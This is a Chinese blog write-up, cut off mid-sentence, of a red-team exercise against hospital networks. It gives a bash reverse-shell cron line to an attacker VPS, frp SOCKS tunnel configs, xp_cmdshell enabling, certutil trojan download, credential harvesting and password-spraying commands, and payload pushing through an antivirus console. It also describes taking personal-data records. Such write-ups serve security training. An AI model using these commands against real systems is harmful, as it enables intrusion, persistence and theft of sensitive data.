---
title: 记一次有趣的地市攻防演练经历 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/16813870.html
source: 博客园 - 渗透测试中心
date: 2022-10-22
fetch_date: 2025-10-03T20:36:07.112351
---

# 记一次有趣的地市攻防演练经历 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [记一次有趣的地市攻防演练经历](https://www.cnblogs.com/backlion/p/16813870.html "发布于 2022-10-21 16:17")

###

## 0x00 写个开头凑字数

这次攻防打的还是比较有意思的，开局电脑摆烂恼火的很，最后没电脑只能拿着销售的电脑疯狂输出。

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161646416-405931814.png)

去拿电脑没一会的功夫我们的私有目标就被干出局了，这次的规则还是有点问题按系统分给各个队伍，不是按照目标单位分的，别人分到我们私有目标的部分系统基础分和数据分薅完一下被干出局了，后面再打只有100路径分，还有老6盯着我们的私有目标打，有个泛微office的洞我们手上没有，目标一放出来就穿了，怪自己太菜了。

排名最后还算理想吧最终排名第三，跟两个技术大哥没后端支撑的情况排到前三还是可以的，前面两位重量级选手卷不过啊，一个提交0day另外一个后端支撑有名的卷，最后前两名分数比我们高出一半多。

废话讲完了，开始我们的内容，码打的严师傅们勿怪，文章最后欢迎师傅们留下评论来交流。

## 0x01 目标

## 某医院外网弱口令

第一天分了私有目标和公共目标，这个目标是公共池目标，运气也是比较好外网一个弱口令直接进去了，主要就是要知道IP地址，突破到内网这里没啥技术含量，目标给的是一个官网的地址，估计其他队伍的师傅们都去冲云上官网那个IP了，后面云上的我们也通过信息科专用共享服务器上密码文件拿到了所有权限。

### 攻击路径

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161647531-1984277052.png)

下面我会按照上面图上标记的序号说明内网攻击过程

### 路径1/路径2 外网弱口令

这里说下这个目标IP怎么来的，通过IP地址收集C段信息找到h3c设备，默认审计账号密码登陆上去命令控制台查看对应授权信息确定是目标IP地址，但是审计账号没有配置权限没法做vpn隧道这些，所以做了个全端口扫描发现一个非标准端口的ssh弱口令，这里拿到服务器权限后我先做了一个反弹shell计划任务。

crontab -e编辑计划任务

```
bash -c 'exec bash -i &>/dev/tcp/you vps ip/you vps port <&1'
```

做完计划任务之后我才上fscan扫描，发现内网很多ssh、mssql弱口令，ssh反弹shell计划任务又做了几台，防止一会动作太大掉了。

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161649471-196759183.png)

内网弱口令一薅一大把，建个frp方便一会去内网翻东西，下载对应编译好的版本就可以。

项目地址：[https://github.com/fatedier/frp](https://github.com/fatedier/frp/releases/download/v0.37.1/frp_0.37.1_linux_amd64.tar.gz)

frp server

```
[common]
bind_port = 8945
```

frp client

```
[common]
server_addr = you vps ip
server_port = 8945
tls_enable = ture
pool_count = 5

[plugin_socks]
type = tcp
remote_port = 35145
plugin = socks5
# 认证 免认证把下面两行去掉
plugin_user = admin
plugin_passwd = Admin@123
use_encryption = true
use_compression = true
```

vps上执行

```
./fprs -c frps.ini
```

跳板机上执行

```
./fprc -c frpc.ini
```

确定连接没问题之后nohup &到后台，这里如果用的腾讯云或者阿里这种vps一定记得端口组里面开启对应的端口，否则连接不上，proxifier确定代理可用。

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161650416-1915809487.png)

### 路径3 运维机器

这里通过刚才fscan扫描到的mssql弱口令打的一台运维终端主机

```
# 开启xp_cmdshell
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp\_configure 'xp_cmdshell', 1;RECONFIGURE;
# 命令执行
exec master..xp_cmdshell "whoami"
```

相关文章

<https://www.cnblogs.com/websecyw/p/11016974.html>

确定命令正常执行是个system权限，certutil下载木马上线，抓出密码后确定管理员不在线远程到桌面。

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161651644-1522260479.png)

### 路径4 服务器所有权限

远程到终端上面才知道这台机器是运维的机器，终端上面打开了sql server连接软件，同样使用上面的命令开启xp\_cmdshell执行命令，这里sql server数据库做了降权操作，权限是sqlserver服务权限。

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161652642-595726973.png)

这里上马子的时候一直有问题权限太低了，上面有火绒企业版开启了系统加固，temp目录写文件写不进去，只拿了sqlserver权限，后面测试了下关闭火绒还是不行，应该是本来sqlserver权限就比较低，后面发现火绒控制台可以分发文件自动执行马子就没管了，这个可以后面复现下环境研究下。

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161654184-2067944113.png)

查看浏览器保存的密码，火狐浏览器里面保存了火绒控制台的账号密码，还有其他一些平台的账号密码，密码收集一下一会可以撞密码。

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161655265-1896483250.png)

everything文件搜索关键字，不管服务器还是终端的文件都仔细翻下，说不定就有意外收获。

```
密码|信息科|资产表|拓扑|账号|设备|pass|user|config|管理|规划
```

ereryting高级用法（正则表达式），也可以使用content搜索文件内容，文件内容搜索比较慢。

ererything相关文章 <https://www.jianshu.com/p/9c0ab75a264f>

在电脑上找到了设备密码信息还有拓扑信息

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161656417-1362338269.png)

设备服务器所有信息

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161657847-1902012276.png)

基本上是所有的网络设备和服务器权限了，这里整理下密码去撞一下密码，在整理密码的的时候发现这个密码是有规律的密码，梳理一下密码的规律使用社工密码生成脚本去生成一些密码。

工具下载地址：<https://github.com/cityofEmbera/CPassword>

工具使用比较简单，我们只需要修改username.txt里面的名字就可以了，dict.txt里面有自带的规则，我们也可以稍作修改，比如增加一下密码里面自带的一些规律，还有最近的年份信息，比如：

```
@2013
@2014
@2015
@2016
@2017
@2018
@2019
@2020
@2021
@2022
#2013
#2014
#2015
#2016
#2017
#2018
#2019
#2020
#2021
#2022
123!@#
!@#123.
@233
!@#345
!@#qwe
```

**python3 createDict.py**就会自动生成密码文件，密码保存在createdict.txt文件里面，密码生成后丢给kscan指定密码文件去撞密码。

```
kscan.exe -t 10.0.0.0/8 --hydra --hydra-pass file:pwd.txt
```

### 路径5 火绒控制台文件分发

这里就是使用火绒控制台分发文件的功能直接下发文件，这里也是神奇哈文件分发后居然自动执行了，牛呀牛呀

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161659083-1748206240.png)

火绒控制台这里不知道为啥我的浏览器一开控制台直接卡死，找J师傅给我看的，文件直接分发下去

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161700506-1110922897.png)

装了火绒的机器全部上线，有些内网机器没上线，这里CS 4.3有问题选择中转监听器生成文件生成不了

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161702252-489860826.png)

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161704347-1864018902.png)

看了下有一台靶标机器也在，芜湖分数基本算拿满了，服务器、网络设备、终端的分再加上回收站翻到的带公民身份信息的数据4w条，6k分到手了

### 路径6 云上资产

这里打到一台信息科共享服务器是通过刚才收集到的口令撞密码撞出来的，还有上面sqlserver弱口令也可以执行命令，因为前面sa弱口令实在太多了，没一个一个去打，这里有口令直接使用工具打一下上线

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161705444-2012404514.png)

随便翻了下文件发现E盘有个信息科专用文件夹点开一看好家伙云上的资产也拿到了

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161706401-44181351.png)

### 路径7 域名权限

用刚才的账户密码登陆获取域名解析权限

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161707158-291735715.png)

云服务器权限，其中一台服务器是官网服务器，是其他队伍的靶标直接拿了

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161708020-983389508.png)

### 路径8 云服务器权限

直接阿里云控制台登陆上去用c2生成powershell上线

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161708774-2095130156.png)

## 某综合医院

这个目标是开始后的第三天晚上开放社工还有近源搞的

### 攻击路径

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161709392-1207090892.png)

### 路径1 wifi口令

开放社工和近源那天立马就去报名了，吃完饭换掉工作服拿着手机就冲去医院了，之前手机上刷了kali nethunte，编译了一些arm版本的工具完全够用了，只要在内网建立个立足点就可以了。

到现场之后打开wifi万能钥匙搜索附近的wifi

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161710061-961231086.png)

连上wifi确定可以通到靶标IP地址，微信扫描二维码密码取出来，一会内网再撞一下密码。

![image.png](https://img2022.cnblogs.com/blog/1049983/202210/1049983-20221021161711159-126424454.png)

登陆网关地址发现是h3c出口设备，弱口令登陆到设备上面有网...